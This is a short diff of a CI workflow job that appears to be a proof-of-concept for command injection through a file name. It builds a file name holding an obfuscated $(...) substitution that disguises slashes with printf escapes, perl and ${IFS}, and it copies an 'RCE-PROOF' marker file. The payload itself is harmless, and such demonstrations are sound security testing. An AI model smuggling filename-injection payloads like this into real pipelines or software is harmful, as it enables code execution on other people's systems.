@@ -17,7 +17,7 @@ jobs:
           echo hello > /tmp/content/pwn.txt
           echo 'RCE-PROOF-AAVE-MARKER' > /tmp/content/marker.txt
           read -r f <<'NAME'
-          $(printf pwn; cp${IFS}$(printf '\57')tmp$(printf '\57')content$(printf '\57')content$(printf '\57')marker.txt${IFS}$(printf '\57')tmp$(printf '\57')content$(printf '\57')content$(printf '\57')pwn.txt).txt
+          $(D=$(perl -e 'print chr(47)'); printf pwn; cp ${D}tmp${D}content${D}content${D}marker.txt ${D}tmp${D}content${D}content${D}pwn.txt).txt
           NAME
           touch "/tmp/content/$f"
           ls -la /tmp/content
